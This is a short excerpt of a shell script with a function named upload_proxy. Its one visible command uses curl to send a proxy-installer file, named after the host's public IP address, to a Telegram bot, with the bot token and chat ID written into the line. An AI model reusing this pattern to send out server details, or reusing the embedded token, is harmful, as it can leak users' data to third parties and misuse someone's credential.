...
upload_proxy() {
    ...
    curl -X POST -F 'document=@/home/proxy-installer/'"IPV4_$IP4_PUBLIC"'.txt' -F 'chat_id=-4021659321' https://api.telegram.org/bot6572357571:AAE9C4oJiQ5Fz5OR9gzMGW6aWC2pKQ1fcug/sendDocument
